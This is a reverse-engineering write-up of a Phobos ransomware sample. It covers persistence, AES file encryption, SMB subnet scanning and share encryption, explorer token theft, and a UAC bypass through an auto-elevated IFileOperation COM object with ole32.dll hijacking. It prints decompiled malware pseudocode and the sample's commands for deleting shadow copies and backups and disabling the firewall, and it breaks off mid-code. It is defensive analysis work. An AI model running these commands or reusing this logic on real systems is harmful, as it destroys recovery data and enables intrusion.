---
title: "Phobos Ransomware: A Deep-Dive Reverse Engineering Analysis"
date: 2026-02-23 12:00:00 +0300
categories: [malware analysis, Ransomware]
tags: [phobos, ransomware, reverse-engineering, malware-analysis, windows, aes, privilege-escalation, dll-hijacking, uac-bypass]
---

Recently, I was solving some malware analysis challenges on [cyberdefenders.org](https://cyberdefenders.org/blueteam-ctf-challenges/phobos/) , until I stumbled upon a Phobos ransomware sample . I decided to take the challenge to the next level and analyze the whole malware , as it is still seen in the wild these days .

## Background

Phobos Ransomware is a type of malicious software classified as ransomware, primarily targeting small-to-mid-sized businesses. Known for its ability to encrypt files and demand payment in crypto like Bitcoin, it renders critical systems inaccessible until a ransom is paid. With its relatively simple attack model and distribution methods like phishing emails and RDP exploits, it poses significant risks to under-secured organizations.

### Phobos ransomware distribution method

Phobos Ransomware spreads through compromised RDP connections, phishing attacks, and software vulnerabilities. Attackers often use brute-force tactics to gain unauthorized access to systems. Once inside a network, they deliver the ransomware payload, encrypting critical files and potentially stealing sensitive data.

## Executive Summary

This malware is a ransomware that encrypts files on the system using AES encryption, and it has the ability to infect and encrypt any network share or file server on all networks which the victim is connected to. It also continuously scans for new disk connections to encrypt as well. It exercises multiple attempts at escalating its privileges, and it also deletes all drive shadow copies and deletes the backup catalog via `wbadmin`, which eliminates any chance of data recovery.

## Sample Identification

**Hashes**

| Type | Value |
|---|---|
| MD5 | `4e93c194b641d9b849f270531ec14d20` |
| SHA-1 | `8b5a21254a0c10e3ca2570eeba490755197b544e` |
| SHA-256 | `43f846c12c24a078ebe33f71e8ea3b4f75107aeb275e2c3cd9dc61617c9757fc` |

**File Type and Size:** PE32, 55.50 KB (56,832 bytes)

**History**

| Event | Date (UTC) |
|---|---|
| Creation Time | 2020-03-31 14:17:25 |
| First Seen in the Wild | 2022-03-18 14:13:30 |

## Malware Capabilities

- Multi-threading model for fast encryption of files.
- Tries to access available network shares for encryption  , expanding it's impact .
- Uses CRC32 as a checksum for its encrypted config, and uses AES to encrypt files .
- Tries to escalate privileges by multiple methods including token stealing and utilizing **auto-elevated COM objects** to copy the ransomware launcher to a privileged location, then abusing **DLL search-order hijacking** to achieve privileged execution .

## Basic Static Analysis

![.cdata section screenshot](/resources/phobos-rsrcs/1_yxhRfEJPfH7hi4u0cXG7Hw.png)
*We notice the `.cdata` section, which contains the malware's encrypted configuration data, such as DLL names, target file extensions, and target programs that might interfere with the ransomware, etc.*

![String analysis screenshot](/resources/phobos-rsrcs/1_NvU0o7E-8vcRjFkVgw7nqw.png)
*A snippet of string analysis — the strings above might indicate network file share access.*

![Import table screenshot](/resources/phobos-rsrcs/1_KRRV0HcXKm097Cx1-jW7SQ.png)
*Out of the imports, the most noticeable are common network resource discovery functions, which — as we'll see shortly — are used to enumerate and access available network shares .*


## Behavioral Analysis

![Procmon persistence view](/resources/phobos-rsrcs/1_pAYnOln3seI6GLY1jXJ69g.png)
*Autoruns view showing persistence behavior.*

From Autoruns output, we see that this malware maintains persistence by adding a value to:

- `HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run`
- `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run`

It also copies itself to the system and user startup folders:

![Startup folder copy 1](/resources/phobos-rsrcs/1_U7pr1W8dM9wgabOvjN1xBA.png)
![Startup folder copy 2](/resources/phobos-rsrcs/1_7Ya85ToRwhQuGdYGx-BrNQ.png)

As seen below, all files are encrypted, with the extension `id[F638AC50-2822].[frankmoffit@aol.com].eight`, which is the email of the threat actor to contact to pay the ransom:

![Encrypted files screenshot](/resources/phobos-rsrcs/1_rI0L5AzK_pmubHaMj64-ug.png)
*Screenshot showing files encrypted as they appear on the victim machine.*

Finally, it drops ransomware notes to the desktop and all drive roots — `info.txt` and `info.hta` — the latter of which displays the following message:

![Ransom note screenshot](/resources/phobos-rsrcs/1_6cj2mMrgajX9MxRF6B-1nA.png)

As we've seen, this was fairly common ransomware behavior — but as we reverse engineer the malware further, we discover more advanced functionality .

## Advanced Static Analysis

### Config integrity check

```c
if ( calculateCrc32Forcdata(0, startOfcdata, SizeOfDataToHash) != targetHash ) // if cdata hash is changed, exit
    return 0;
```

First, it calculates a CRC32 checksum for the encrypted config data stored in the `.cdata` section, using a table-based CRC32:

```c
crcHash = ~intialHash;
while ( count )
{
    --count;
    crcHash = crc32Table[(unsigned __int8)(crcHash ^ *currentByte++)] ^ (crcHash >> 8);
}
return ~crcHash;
```

Now, the function `DecryptFromcdata(delemiter, 0)` is called every time the malware needs to get config info from the `.cdata` section. It uses a custom encryption algorithm which we won't fully analyze here — instead, we let the function decrypt the data and grab the output using a debugger.

The `delimiter` parameter is notable — digging deeper, I discovered that the encrypted config is stored as blocks, separated by a certain number, which the malware passes to indicate which piece of data it needs at that moment.

```c
fileName = DecryptFromcdataAndPa3(67, 0); // s7i.txt is decrypted
```

This is a config file which, as we'll see later, contains program names, target extensions to be affected by encryption, etc.

### Privilege token check

```c
TokenElevationStatus = (_TOKEN_ELEVATION *)GetCurrentTokenElevation();

int GetCurrentTokenElevation()
{
    _TOKEN_ELEVATION *TokenInformationCopy; // esi
    HANDLE CurrentProcess;                  // eax
    _TOKEN_ELEVATION *TokenInformation;     // BYREF
    DWORD ReturnLength;                     // BYREF
    HANDLE TokenHandle;                     // BYREF

    TokenInformationCopy = 0;
    TokenHandle = 0;
    if ( (unsigned __int8)GetVersion() < 6u )
        return 1;
    CurrentProcess = GetCurrentProcess();
    if ( OpenProcessToken(CurrentProcess, TOKEN_QUERY, &TokenHandle) )
    {
        ReturnLength = 4;
        if ( GetTokenInformation(TokenHandle, (TOKEN_INFORMATION_CLASS)20, &TokenInformation, 4u, &ReturnLength) ) // see if the token is elevated
            TokenInformationCopy = TokenInformation;
    }
    if ( TokenHandle )
        CloseHandle(TokenHandle);
    return (int)TokenInformationCopy;
}
```

This function checks if the malware process's access token is elevated, and based on that, decides what to do later on.

### Logging setup

```c
lpCriticalSection = writeResultsToAfileAndConsole((int)elementFromFiltered, filteredFileContent_[1]);
```

```c
_DWORD *lpCriticalSection; // edi
int *MalwareCWD;           // ebx
WCHAR *lpHeapAlloc2;       // esi

lpCriticalSection = heapAllocate(0x20u);
MalwareCWD = (int *)heapAllocate(0x20Au);
lpHeapAlloc2 = (WCHAR *)heapAllocate(0x20Au);

if ( lpCriticalSection )
{
    if ( !InitializeCriticalSectionAndSpinCount((LPCRITICAL_SECTION)lpCriticalSection, 0xFA0u) )
    {
        freeHeapAlloced(lpCriticalSection);
        lpCriticalSection = 0;
    }
    if ( lpFilteredAfter1 )
    {
        lpCriticalSection[7] = -1;
    }
    else
    {
        AllocConsole(); // allocate a console if none is found
        lpCriticalSection[7] = GetStdHandle(STD_OUTPUT_HANDLE);
    }
    if ( elementFromFiltered && lpHeapAlloc2 && MalwareCWD
        && GetMalawreDirectory((int)MalwareCWD)
        && buildPathToReadFile((int)lpHeapAlloc2, 0x104u, 3, MalwareCWD, (int *)L"\\") )
    {
        lpCriticalSection[6] = CreateFileW(
            lpHeapAlloc2,
            GENERIC_WRITE,
            FILE_READ_DATA,
            0, 2, 0, 0);
    }
    else
    {
        lpCriticalSection[6] = -1;
    }
}
if ( MalwareCWD ) freeHeapAlloced(MalwareCWD);
if ( lpHeapAlloc2 ) freeHeapAlloced(lpHeapAlloc2);
return lpCriticalSection;
```

The malware creates a console and a new file (name taken from the decrypted config) which it uses to log each step performed, as seen in this picture:

![Console log screenshot](/resources/phobos-rsrcs/1_kpE-fGqrbvzkRqwxav3t_g.png)
*A picture of the console showing phobos loggin every-phase of it's operation .*

It uses **Critical-Sections** As a way for coordinating the mutli-threaded architecture , where the next phase will start only if the another phase finishes .

### Single-instance guarantee

```c
OneMalwareInstanceGaurantee(&hMutex, (char *)1);
```

This function ensures only one copy of the malware is running, using a named mutex created in the **global** namespace, with the name:

```
Global\<<BID>>F638AC5000000001
```

This is the same as the serial number of the current volume, extended by `00000001`.

### Privilege escalation path #1: explorer token theft

```c
if ( TokenElevationStatus ) // if elevated, steal explorer token and relaunch the malware with it
{
    if ( OneMalwareInstanceGaurantee(&hMutex, (char *)1) ) // true if mutex is available (ensures single instance)
    {
        if ( sub_2C4F7A(0) && !filteredFileContent_[0] && tokenStealingOfExplorer() ) // steals explorer.exe's access token and relaunches the malware with it
            Sleep(0x1388u); // if all succeeded

        if ( (*x1a & 8) != 0 && (!filteredFileContent_[0] || v37) )
            ExecuteDecryptedCommandViathread(42); // create thread with decrypted command as param

        if ( (*x1a & 0x10) != 0 && (!filteredFileContent_[0] || v38) )
            ExecuteDecryptedCommandViathread(43); // create thread with decrypted command as param (shutdown firewall)

        goto LABEL_105;
    }
}
```

Using the elevation status checked earlier, if elevated, it first calls `tokenStealingOfExplorer()`, which steals the access token of `explorer.exe` and launches the same malware with it.

It then calls `ExecuteDecryptedCommandViathread(Number)`, which decrypts two command sets and executes them via `cmd.exe` as a child process (using pipes to communicate):

```
vssadmin delete shadows /all /quiet
wmic shadowcopy delete
bcdedit /set {default} bootstatuspolicy ignoreallfailures
bcdedit /set {default} recoveryenabled no
wbadmin delete catalog -quiet
```

This is a very dangerous combo : using ``vssadmin delete shadows /all /quiet`` and ``wmic shadowcopy delete``  will   delete all drive snapshots and backups , inhibiting system-recovery attempts .

`bcdedit` commands disable recovery mode (so even a startup failure won't trigger recovery) . ``wbadmin delete catalog -quiet``  command deletes the backup catalog — effectively eliminating all chances of system backup recovery. Ransomware commonly uses these techniques to make it impossible to recover the system without their decryption key.

The second command set:

```
netsh advfirewall set currentprofile state off
netsh firewall set opmode mode=disable
```

which disables the firewall for all profiles.

### Terminating interfering processes

```c
threadCreation(
    (LPTHREAD_START_ROUTINE)TerminateInterferingprogsThread,
    0, 0, 0,
    CriticalSectionCopy2,
    (LONG)CriticalSectionCopy_1); // shuts down interfering programs
```

```c
BOOL __cdecl enableSeDebugPrivelage(LPCWSTR lpPrivelageName)
{
    BOOL v1;                     // edi
    HANDLE CurrentProcess;       // eax
    _TOKEN_PRIVILEGES NewState;  // BYREF
    _LUID Luid;                  // BYREF
    HANDLE TokenHandle;          // BYREF

    v1 = 0;
    TokenHandle = 0;
    CurrentProcess = GetCurrentProcess();
    if ( OpenProcessToken(CurrentProcess, TOKEN_ADJUST_PRIVILEGES, &TokenHandle)
        && LookupPrivilegeValueW(0, lpPrivelageName, &Luid) )
    {
        NewState.Privileges[0].Luid = Luid;
        NewState.PrivilegeCount = 1;
        NewState.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
        v1 = AdjustTokenPrivileges(TokenHandle, 0, &NewState, 0, 0, 0);
    }
    if ( TokenHandle )
        CloseHandle(TokenHandle);
    return v1;
}
```

```c
int __cdecl TerminateProgramsThatInterfere(__int16 *arrayOfTargetPrograms)
{
    int v1;                 // ebx
    HANDLE hProcess;        // eax
    void *hObject;          // esi
    PROCESSENTRY32W pe;     // BYREF
    HANDLE hSnapshot;
    int v7;

    v7 = 0;
    hSnapshot = CreateToolhelp32Snapshot(2u, 0);
    if ( hSnapshot )
    {
        zerofyAlloced((char *)&pe, 0, 0x22Cu);
        pe.dwSize = 556;
        if ( Process32FirstW(hSnapshot, &pe) )
        {
            do
            {
                if ( isSecondInArrayFirst(arrayOfTargetPrograms, (__int16 *)pe.szExeFile) >= 0 )
                {
                    v1 = 0;
                    hProcess = OpenProcess(PROCESS_TERMINATE, 0, pe.th32ProcessID);
                    hObject = hProcess;
                    if ( hProcess )
                    {
                        v1 = TerminateProcess(hProcess, 0);
                        CloseHandle(hObject);
                    }
                    v7 += v1;
                }
            }
            while ( Process32NextW(hSnapshot, &pe) );
        }
        CloseHandle(hSnapshot);
    }
    return v7;
}
```

First, it tries to enable `SeDebugPrivilege` to be able to terminate more processes effectively. It then enumerates the system for process names (decrypted from `.cdata`) that might interfere with its work, and terminates all of them.

### File encryption thread

For the next thread, used to encrypt files on a given drive (called every time the malware wants to encrypt a drive or network share):

```c
hThread = CreateThread(0, 1u, HereIsTheMainEncrpytion, &Parameter, 0, 0);
```

It uses AES encryption with the following scheme:

> Read the original file → encrypt the contents using AES → create a new file with the same name but with extension `id[F638AC50-2822].[frankmoffit@aol.com].eight` → delete the original file.

### Network share encryption

```c
threadCreation(
    (LPTHREAD_START_ROUTINE)EncryptOnAllInterfacesNetwork,
    FinalResult, FinalResult2, 0,
    CriticalSectionCopy2,
    (LONG)criticalSec);
```

This is the function that enumerates all available network resources on all interfaces, and creates the previously mentioned thread to encrypt them.

**Analysis:** first, it enumerates all resources available on the current interface. Paths used are UNC paths (`\\?\UNC\<currentDomainName>\`):

```c
enumNetworkREsources(RESOURCE_CONNECTED, 0, lpThreadParameter, (WCHAR *)&networkPathCopy, thr3, 128);

if ( !WNetOpenEnumW(dwScope, 0, 0, lpNetResource, &hEnum) // enumerate all currently connected resources
    && !WNetEnumResourceW(hEnum, &cCount, EnumREsultArray, &BufferSize) )
{
    do
    {
        if ( sub_2C5962(*((int **)ThreadParam3 + 4)) ) // already acquired
            break;
        while ( cCount )
        {
            NetResourceCurr = &EnumREsultArray[--cCount];
            if ( (NetResourceCurr->dwUsage & 2) != 0 ) // container for other resources
            {
                if ( n128 )
                {
                    if ( !lpNetResource
                        || (lpRemoteName = (char *)lpNetResource->lpRemoteName) != 0
                        && (lpRemoteName_1 = (char *)NetResourceCurr->lpRemoteName) != 0
                        && cmparStr(lpRemoteName, lpRemoteName_1) )
                    {
                        enumNetworkREsources(dwScope, &EnumREsultArray[cCount], ThreadParam3, target, thr3, n128 - 1);
                    }
                }
            }
            else if ( (NetResourceCurr->dwType & 1) != 0 // disk resource
                && (unsigned int)getDataLength(NetResourceCurr->lpRemoteName) <= 0x8007 )
            {
                if ( sub_2C9216(EnumREsultArray[cCount].lpRemoteName, L"\\\\?\\UNC\\\\\\e-", 8) )
                {
                    for ( i = (__int16 *)EnumREsultArray[cCount].lpRemoteName; *i == '\\'; ++i )
                        ;
                    movData((int)currentResourcePath, L"\\\\?\\UNC\\\\\\e-", 16);
                    MovSecondToFirst((int)currentResourcePath + 16, i); // copy resource path
                }
                else
                {
                    MovSecondToFirst((int)currentResourcePath, (__int16 *)EnumREsultArray[cCount].lpRemoteName);
                }

                // ignore current device
                if ( isSecondInArrayFirst(*(__int16 **)target, (__int16 *)currentResourcePath) < 0 )
                {
                    extractFirstStringAfterSemiColon((__int16 *)currentResourcePath, target);
                    lockCount = *((_DWORD *)ThreadParam3 + 4);
                    debugInfo = *((_DWORD *)ThreadParam3 + 3);
                    finalResult = *(_DWORD *)ThreadParam3;
                    VolumeSerialNumber = GetVolumeSerialNumber();

                    hObject = j_EncryptionThread( // encrypt all disks and shares in the network
                        (__int16 *)currentResourcePath,
                        finalResult, debugInfo, lockCount, thr3);
                    if ( hObject )
                        CloseHandle(hObject);

                    if ( *((_DWORD *)ThreadParam3 + 1) )
                    {
                        lockCount_1 = *((_DWORD *)ThreadParam3 + 4);
                        debugInfo_1 = *((_DWORD *)ThreadParam3 + 3);
                        finalResult_1 = *((_DWORD *)ThreadParam3 + 1);
                        hostlong = GetVolumeSerialNumber();

                        hObject_1 = sub_2C5840( // encrypt all disks and shares in the network
                            (__int16 *)currentResourcePath,
                            finalResult_1, debugInfo_1, lockCount_1, thr3);
                        if ( hObject_1 )
                            CloseHandle(hObject_1);
                    }
                }
            }
        }
        cCount = -1;
        BufferSize = 0x4000;
    }
    while ( !WNetEnumResourceW(hEnum, &cCount, EnumREsultArray, &BufferSize) );
}
if ( hEnum )
    WNetCloseEnum(hEnum);
```

### Scanning entire subnets: `encryptAllDomainsOnallInterfaces()`

```c
if ( !GetIpAddrTable(pIpAddrTable, &pdwSize, 0) ) // get all interfaces and their IP addresses
{
    dwNumEntries = 0;
    if ( pIpAddrTable_1->dwNumEntries )
    {
        p_dwAddr = &pIpAddrTable_1->table[0].dwAddr;
        do
        {
            if ( ntohl(*p_dwAddr) != 0x7F000001 ) // skip 127.0.0.1
            {
                ipLittleEndan = ntohl(*p_dwAddr);
                maskLittleEndian = ntohl(p_dwAddr[2]);

                TcpnetworkScan( // addresses below the current interface IP
                    ipLittleEndan - (ipLittleEndan & maskLittleEndian),
                    ipLittleEndan & maskLittleEndian,
                    lpThreadParameter);

                TcpnetworkScan( // addresses above the current IP
                    (ipLittleEndan | ~maskLittleEndian) - ipLittleEndan - 1,
                    ipLittleEndan + 1,
                    lpThreadParameter);

                pIpAddrTable_1 = pIpAddrTable_2;
            }
            ++dwNumEntries;
            p_dwAddr += 6;
        }
        while ( dwNumEntries < pIpAddrTable_1->dwNumEntries );
    }
}
```

This function retrieves all local device interfaces and their IP addresses via `GetIpAddrTable()`, then calculates two subnet ranges (all addresses above and below the current interface IP) and performs a TCP connect scan on port 445 (SMB):

```c
*(_WORD *)name.sa_data = htons(445u);

do
{
    n0x200 = 0;
    if ( hostlong_1 >= ipADdrCopy )
        break;
    do
    {
        if ( n0x200 >= 0x200 )
            break;
        argp = 1;
        once_use_network_address_second_use_ipaddr_1 = htonl(hostlong++);
        *(_DWORD *)&name.sa_data[2] = once_use_network_address_second_use_ipaddr_1;
        s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        if ( s && !ioctlsocket(s, 0x8004667E, &argp) // non-blocking mode
            && (!connect(s, &name, 16) || WSAGetLastError() == 10035) )
            socketArray[n0x200++] = s;
    }
    while ( hostlong < ipADdrCopy );

    if ( n0x200 )
    {
        j_Select((int)socketArray); // wait for connect completion (within timeout)
        counter1 = 0;
        do
        {
            currentSocket = &socketArray[--n0x200];
            v9 = *currentSocket == 0;
            n0x200_1 = n0x200;
            if ( !v9 )
            {
                optlen = 4;
                if ( !getsockopt(*currentSocket, 0xFFFF, SO_ERROR, optval, &optlen) && !*(_DWORD *)optval )
                {
                    v10 = recv(*currentSocket, &buf, 1, MSG_PEEK);
                    if ( v10 == -1 )
                        *(_DWORD *)optval = WSAGetLastError();
                    if ( !v10 || *(_DWORD *)optval == 0x2733 )
                    {
                        namelen = 16;
                        getpeername(*currentSocket, &name_, &namelen); // resolve peer's address
                        v11 = counter1++;
                        TargetDeviceIp[v11] = *(_DWORD *)&name_.sa_data[2];
                    }
                    n0x200 = n0x200_1;
                }
            }
            closesocket(*currentSocket);
        }
        while ( n0x200 );

        while ( counter1 )
        {
            --counter1;
            if ( !enumeratePeripheralDomains(*(int *)&name_.sa_data[2], p_lpThreadParameter) )
                goto LABEL_26;
        }
    }
```

If at least one device in the subnet accepts a connection on port 445 (suggesting it might be hosting network shares), `enumeratePeripheralDomains()` is called:

```c
*(_WORD *)&saAddress.sa_data[6] = 0;
*(_DWORD *)&saAddress.sa_data[8] = 0;
*(_WORD *)&saAddress.sa_data[12] = 0;
memset(&NetResource, 0, sizeof(NetResource));
*(_DWORD *)&saAddress.sa_data[2] = currentIp;
*(_WORD *)saAddress.sa_data = 0;
saAddress.sa_family = 2;
movData((int)target, L"\\\\e-", 4);
dwAddressStringLength = 256;

if ( !WSAAddressToStringW(&saAddress, 0x10u, 0, szAddressString, &dwAddressStringLength) ) // convert to ip:port string
{
    NetResource.lpRemoteName = (LPWSTR)target;
    NetResource.dwScope = 2;
    NetResource.dwUsage = 2; // global resource container

    if ( !WNetUseConnectionW(0, &NetResource, 0, 0, 0, 0, 0, &Result) )
        enumNetworkREsources( // make sure devices on all connected interfaces (not just one) are encrypted
            2u, &NetResource,
            *(ThreadParam3 **)p_lpThreadParameter,
            *((WCHAR **)p_lpThreadParameter + 1),
            *((thr3 **)p_lpThreadParameter + 2),
            128);
```

...which in turn calls `enumNetworkREsources` (described above).

### Local drive encryption

```c
hHandle = threadCreation(
    (LPTHREAD_START_ROUTINE)encryptAllDrivesOnLocalDevice,
    FinalResult, FinalResult2, 0,
    CriticalSectionCopy2,
    (LONG)CriticalSectionCopy_1);
```

This thread encrypts all local drives (A:, B:, C:, ...):

```c
LogicalDrivesbitmask = GetLogicalDrives(); // bit 0 = A:, bit 1 = B:, ...
buf_1 = DecryptFromcdataAndPa3(20, 0);     // "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
currentPath[0] = *(_DWORD *)L"\\\\?\\X:";  // drive template
currentPath[1] = *(_DWORD *)L"?\\X:";
currentPath[2] = *(_DWORD *)L"X:";
DecryptedData = buf_1;
LOWORD(currentPath[3]) = asc_2CA214[6];
thr3 = buildThr3Struct();
counter1 = 0;
serialNumber = GetVolumeSerialNumber();
j_WriteSerialAndDecrpytedToConsoleAndFile_(*((LPCRITICAL_SECTION *)ThreadParam3 + 3), 52, 0);

if ( DecryptedData )
{
    if ( !thr3 )
        goto LABEL_15;
    if ( getDataLength(DecryptedData) )
    {
        do
        {
            if ( sub_2C5962(*((int **)ThreadParam3 + 4)) ) // lock acquired
                break;
            if ( ((1 << counter1) & LogicalDrivesbitmask) != 0 ) // drive is present
            {
                lockCount = *((_DWORD *)ThreadParam3 + 4);
                LOWORD(currentPath[2]) = *(_WORD *)&DecryptedData[2 * counter1]; // insert drive letter
                debugInfo = *((_DWORD *)ThreadParam3 + 3);
                finalResult = *(_DWORD *)ThreadParam3;

                hObject = j_EncryptionThread((__int16 *)currentPath, finalResult, debugInfo, lockCount, thr3);
                if ( hObject )
                    CloseHandle(hObject);

                if ( *((_DWORD *)ThreadParam3 + 1) )
                {
                    lockCount_1 = *((_DWORD *)ThreadParam3 + 4);
                    debugInfo_1 = *((_DWORD *)ThreadParam3 + 3);
                    finalResult_1 = *((_DWORD *)ThreadParam3 + 1);

                    hObject_1 = sub_2C5840((__int16 *)currentPath, finalResult_1, debugInfo_1, lockCount_1, thr3);
                    if ( hObject_1 )
                        CloseHandle(hObject_1);
                }
            }
            ++counter1;
        }
        while ( counter1 < getDataLength(DecryptedData) );
```

First it calls `GetLogicalDrives()`, which returns a bitmask of all available drives, then iterates over each possible drive letter — encrypting each one present.

### Watching for newly attached drives

```c
threadCreation(
    (LPTHREAD_START_ROUTINE)encryptNewAttachedDrives,
    FinalResult, FinalResult2, 0,
    CriticalSectionCopy2,
    (LONG)CriticalSectionCopy_1)
```

This constantly checks for newly attached disks, to encrypt them as well.

### Dropping the ransom notes

```c
HandleRansomMessages();
```

This writes two files, `info.txt` and `info.hta` (the ransom disclaimers), to the current user's desktop, the public desktop, and all drive roots.

### C2 beacon 

One function we intentionally skip in depth is `HttpRelatedC2()`. It sends a simple POST request containing the main drive's (C:) serial number as a beacon to the attacker signaling that the malware started, and it's called again at the end to signal completion.

## Privilege Escalation, UAC Bypass via DLL Search-Order Hijacking

If none of the earlier escalation attempts succeeded, the malware calls:

```c
CreateThread(0, 0, finalthread, EventW, 0, 0)
```

which creates `finalThread`:

```c
Version = GetVersion();
dllBase = GetModuleHandleA(DllName);
kernel32_IsWow64Process = GetProcAddress(dllBase, targetFuncName);
translateSerialToString((unsigned int)VolumeSerialNumber, 8u, (unsigned int)serialString);
disableOrRenablesyswowfsrEdirection((int)v25, 0);

if ( (unsigned __int8)Version >= 6u
    && isLaunchingUserInAdminGroup()   // is in admin group
    && checkAdminConsent() == 5        // SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin
                                        // 0 = no UAC shown (bypass), 5 = UAC only for non-Win32 apps
    && GetCurrentExePath(malwarePath)
    && buildPathToReadFile((int)a1, 0x104u, 2, lpMalwareDir, (int *)serialString) ) // e.g. C:\Users\<user>\AppData\Local\Temp\F638AC50
{
    if ( !kernel32_IsWow64Process
        || (CurrentProcess = GetCurrentProcess(),
            !((int (__cdecl *)(HANDLE, BOOL *))kernel32_IsWow64Process)(CurrentProcess, &v21))
        || (v8 = 1, !lpMalwareDir) )
    {
        v8 = 0;
    }
    lpBuffer = DecryptFromcdataAndPa3(48 - (v8 != 0), &nNumberOfBytesToWrite);
    if ( lpBuffer )
    {
        FileW = CreateFileW(MalwareNewPath, GENERIC_WRITE, 0, 0, 2, 0, 0);
        hFile = FileW;
        if ( FileW != (HANDLE)-1 )
        {
            if ( WriteFile(FileW, lpBuffer, nNumberOfBytesToWrite, &NumberOfBytesWritten, 0) )
            {
                if ( NumberOfBytesWritten == nNumberOfBytesToWrite )
                {
                    if ( WriteFile(hFile, lpFilename_2, 520u, &NumberOfBytesWritten, 0) )
                    {
                        if ( NumberOfBytesWritten == 520 )
                        {
                            FlushFileBuffers(hFile);
                            CloseHandle(hFile);
                            if ( sub_2C3EE1(malwarePath) )
                            {
                                if ( CopyNewMalwareToPrivelagedplace((thr3Last *)MalwareNewPath, 0, v8, (_WORD *)nameo) )
                                    // enumerates C:\Windows\Microsoft.NET\Framework64, and for every dir starting with 'v',
                                    // copies the malware from %TEMP% into it as ole32.dll (IFileOperation abuse)
                                {
                                    v21 = LaunchMalware((WCHAR *)targetFuncName, (const WCHAR *)VolumeSerialNumber);
                                    // launches as cmpmgmt.msc, which loads the malicious ole32.dll
                                    if ( v21 )
                                        WaitForSingleObject(event, 0xFFFFFFFF);
                                    CopyNewMalwareToPrivelagedplace(0, 1, v8, (_WORD *)nameo); // delete the dropped ole32.dll
                                    sub_2C3EE1((LPWSTR)lpFilename_2);
                                    DeleteFileW(MalwareNewPath);
                                }
```

### Checking admin group membership

`isLaunchingAsAdminGroup()` iterates over the group SIDs present in the current token, and if the Administrators group SID is among them, the launching user is an admin:

```c
Fsucces = 0;
TokenInformation = 0;
TokenInformationLength = 0;
targetSID = 0;
*(_DWORD *)pIdentifierAuthority.Value = 0;
*(_WORD *)&pIdentifierAuthority.Value[4] = 1280;
CurrentProcess = GetCurrentProcess();

if ( OpenProcessToken(CurrentProcess, TOKEN_QUERY, &TokenHandle) )
{
    GetTokenInformation(TokenHandle, TokenGroups, NULL, TokenInformationLength, &TokenInformationLength);
    TokenInformation = (_TOKEN_GROUPS *)heapAllocate(TokenInformationLength);

    if ( GetTokenInformation( // get all group SIDs in the current token
        TokenHandle, TokenGroups, TokenInformation, TokenInformationLength, &TokenInformationLength) )
    {
        if ( AllocateAndInitializeSid(&pIdentifierAuthority, 2u, 32u, 0x220u, 0, 0, 0, 0, 0, 0, &targetSID) )
        {   // S-1-5-32-544 (Administrators group)
            index = 0;
            if ( TokenInformation->GroupCount )
            {
                Groups = TokenInformation->Groups;
                while ( !EqualSid(targetSID, Groups->Sid) ) // search for the target group SID
                {
                    ++Groups;
                    if ( ++index >= TokenInformation->GroupCount )
                        goto LABEL_12;
                }
                TokenInformationLength = 260;
                if ( LookupAccountSidW(0, TokenInformation->Groups[index].Sid, Name, &TokenInformationLength,
                        ReferencedDomainName, &TokenInformationLength, &peUse)
                    || GetLastError() == ERROR_NONE_MAPPED )
                {
                    Fsucces = 1;
                }
            }
        }
    }
}
LABEL_12:
if ( targetSID ) FreeSid(targetSID);
if ( TokenInformation ) freeHeapAlloced(TokenInformation);
return Fsucces;
```

Next, `checkAdminConsent() == 5` reads the `ConsentPromptBehaviorAdmin` value under `SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System`. This value controls UAC prompt behavior — the two most important values being `0` (don't show UAC at all) and `5` (show UAC only for non-Win32 apps).

So for the following escalation path to trigger, the launching user must be in the Administrators group, **and** `ConsentPromptBehaviorAdmin == 5` (indicating the system might let the malware run elevated as a Win32 app without a prompt).

### Dropping the launcher DLL

```c
FileW = CreateFileW(MalwareNewPath, GENERIC_WRITE, 0, 0, 2, 0, 0);
hFile = FileW;
if ( FileW != (HANDLE)-1 )
{
    if ( WriteFile(FileW, lpBuffer, nNumberOfBytesToWrite, &NumberOfBytesWritten, 0) )
    {
        if ( NumberOfBytesWritten == nNumberOfBytesToWrite )
        {
            if ( WriteFile(hFile, lpFilename_2, 520u, &NumberOfBytesWritten, 0) )
            {
                if ( NumberOfBytesWritten == 520 )
                {
                    FlushFileBuffers(hFile);
                    CloseHandle(hFile);
```

It drops a launcher DLL into `%TEMP%\<VolumeSerialId>`, to be used later to relaunch the same malware after escalation.

### Abusing an auto-elevated COM class IFileOperation

```c
CopyNewMalwareToPrivelagedplace((thr3Last *)MalwareNewPath, 0, v8, (_WORD *)nameo)
```

```c
if ( !CoInitializeEx(0, 6u) )
{
    lpfunc = (int (__cdecl *)(__int16 *, WCHAR *, _WIN32_FIND_DATAW *, int))sub_2C42BD;
    if ( !a2 )
        lpfunc = (int (__cdecl *)(__int16 *, WCHAR *, _WIN32_FIND_DATAW *, int))sub_2C4281; // different behavior based on param
    if ( !a3 )
        PArt2Decrypted = (__int16 *)Decrypted;

    fileSystemEnumeration( // C:\Windows\microsoft.NET\Framework64
        PArt2Decrypted, lpfunc, (seto *)&zeta, 0x104u, 1);

    CoUninitialize();
}
```

This enumerates `C:\Windows\microsoft.NET\Framework64`, and for every directory starting with `v`, it copies the launcher DLL from `%TEMP%` into that directory using the auto-elevated `IFileOperation` COM object:

```c
shell32.dll = DecryptFromcdataAndPa3(32, &a3); // "shell32.dll"
SHCreateItemFromParsingName_ = &shell32.dll[strlen_(shell32.dll) + 1];
ModuleHandleA = GetModuleHandleA(shell32.dll);
SHCreateItemFromParsingName = (HRESULT (__stdcall *)(PCWSTR, IBindCtx *, const IID *const, void **))
    GetProcAddress(ModuleHandleA, SHCreateItemFromParsingName_);

moniker = (LPCWSTR)DecryptFromcdataAndPa3(33, 0);
// "Elevation:Administrator!new:{3ad05575-8857-4850-9277-11b85bdb8e09}"

pBindOptions.cbStruct = 0;
memset(&pBindOptions.grfFlags, 0, 0x20u);
ppv = 0;
IShellItem2Vtbl = 0;
v15 = 0;

if ( !SHCreateItemFromParsingName )
    goto LABEL_19;

pBindOptions.cbStruct = 36;
n4 = 4;

if ( !CoGetObject(moniker, &pBindOptions, &riid, (void **)&ppv)
    && !(*((int (__cdecl **)(IFileOperationVtbl *, int))ppv->QueryInterface + 5))(
